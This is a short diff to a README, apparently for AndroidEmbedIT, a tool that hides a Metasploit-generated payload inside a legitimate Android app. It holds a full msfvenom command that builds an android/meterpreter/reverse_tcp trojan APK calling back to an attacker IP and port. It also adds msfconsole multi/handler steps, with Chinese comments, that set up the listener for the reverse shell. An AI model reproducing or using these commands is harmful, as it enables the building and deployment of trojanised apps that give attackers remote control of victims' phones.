@@ -1,5 +1,18 @@
 ## AndroidEmbedIT可以配合meterpreter生成的木马msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.169.76 lport=445 R > Desktop/123.apk进行
 
+
+监听
+root@kali:~# msfconsole
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload android/meterpreter/reverse_tcp #设置payload
+payload => android/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.169.76 #kali的IP
+lhost => 192.168.169.76
+msf exploit(handler) > set lport 445 #对应刚才设的端口
+lport => 445
+msf exploit(handler) > exploit
+
+
 This script performs the following actions to embed a Metasploit
 generated APK file into another legitimate APK.
 
